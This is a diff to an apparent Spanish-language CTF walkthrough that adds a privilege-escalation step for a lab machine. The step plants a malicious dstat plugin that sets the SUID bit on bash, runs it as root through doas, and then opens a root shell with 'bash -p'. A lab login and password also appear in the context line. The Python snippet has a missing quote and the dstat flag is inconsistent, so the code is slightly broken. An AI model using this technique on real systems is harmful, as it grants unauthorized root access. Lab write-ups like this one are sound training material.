@@ -263,3 +263,18 @@ player@10.129.116.169's password: PlayerOftheMatch2022
 ```
 # [](#header-2) Escalada de privilegios
 
+Mirando el servidor encontramos en la carpeta /usr/bin/dstat que utiliza "dstat" que es bastante similiar a sudo. Para escalar de privilegios tendremos que crearnos un pluggin dstat_*algo*.py en la carpeta /usr/local/share/dstat/
+
+```python
+nano dstat_eskere.py
+
+import os
+os.system(chmod u+s /usr/bin/bash')
+```
+Una vez creado este archivo, le damos permisos de ejecución y lo ejecutamos con dstat
+
+```dstat
+doas -u root /usr/bin/dstat --eskere.py
+```
+
+Ejecutamos ```bash -p``` y obtendríamos root, buscamos el directorio /root y allí encontraremos root.txt y habríamos terminado la máquina
